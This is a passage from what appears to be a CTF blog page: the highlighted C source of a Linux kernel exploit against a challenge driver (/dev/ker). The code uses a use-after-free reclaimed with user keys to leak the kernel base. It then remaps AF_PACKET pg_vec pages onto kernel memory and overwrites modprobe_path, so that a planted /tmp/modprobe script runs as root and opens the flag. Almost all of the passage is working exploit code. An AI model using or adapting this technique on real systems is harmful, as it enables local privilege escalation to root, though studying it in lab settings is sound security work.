</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(rv &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] bind (AF_PACKET)</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> s;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">key_alloc</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">description</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">payload</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">plen</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_add_key, &quot;</span><span style="color:#a3be8c;">user</span><span style="color:#c0c5ce;">&quot;, description, payload, plen,
</span><span style="color:#c0c5ce;">                   KEY_SPEC_PROCESS_KEYRING);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">key_read</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">keyid</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buffer</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">buflen</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">key_unlink</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">keyid</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> page_tmp[</span><span style="color:#d08770;">0x10000</span><span style="color:#c0c5ce;">];
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> tmpbuf[</span><span style="color:#d08770;">0x38</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> tmp[</span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> payload[</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key_id[</span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">bind_core</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">unshare_setup</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/ker</span><span style="color:#c0c5ce;">&quot;, O_RDONLY);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">opne /dev/ker error</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(tmp);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">delete </span><span style="color:#c0c5ce;">(tmp);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    key_id[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">key_alloc</span><span style="color:#c0c5ce;">(tmp, payload, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">delete </span><span style="color:#c0c5ce;">(tmp);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> block_nr = </span><span style="color:#d08770;">0x28 </span><span style="color:#c0c5ce;">/ </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// count 为 pg_vec 数组的大小, 即 pg_vec 的大小为 count*8                  
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 第一个参数 block_size/4096 为要分配的 order        
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> packet_fds = </span><span style="color:#8fa1b3;">packet_socket_setup</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x800</span><span style="color:#c0c5ce;">, block_nr, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">key_read</span><span style="color:#c0c5ce;">(key_id[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], page_tmp, </span><span style="color:#d08770;">0xf000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    size_t ptr = page_tmp;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(kbase_addr == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        u_int64_t tmp = *(size_t *)ptr;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((tmp &amp; </span><span style="color:#d08770;">0xfff</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x1d0 </span><span style="color:#c0c5ce;">&amp;&amp; tmp &gt; </span><span style="color:#d08770;">0xFFFFFFFF00000000</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            kbase_addr = tmp - </span><span style="color:#d08770;">0x17741d0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        ptr += </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ptr == page_tmp + </span><span style="color:#d08770;">0xf000</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">error</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">kbase_addr :0x</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, kbase_addr);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">offset :0x</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, (size_t *)ptr-(size_t *)page_tmp);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    *(size_t *)tmp = kbase_addr + </span><span style="color:#d08770;">0xffffffff831d8000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0xffffffff81000000</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// a76
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(tmp);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*page = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1000 </span><span style="color:#c0c5ce;">* block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">page</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(page + </span><span style="color:#d08770;">0xce0</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">/tmp/modprobe</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">14</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">echo -ne &#39;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">xff</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">xff</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">xff</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">xff&#39; &gt; /tmp/dummy</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">echo &#39;#!/bin/sh</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">chmod 777 /flag&#39; &gt; /tmp/modprobe</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">chmod +x /tmp/modprobe</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">chmod +x /tmp/dummy</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/dummy</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">cat /flag</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}
</span></pre>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="/script.js"></script>
</body>
</html>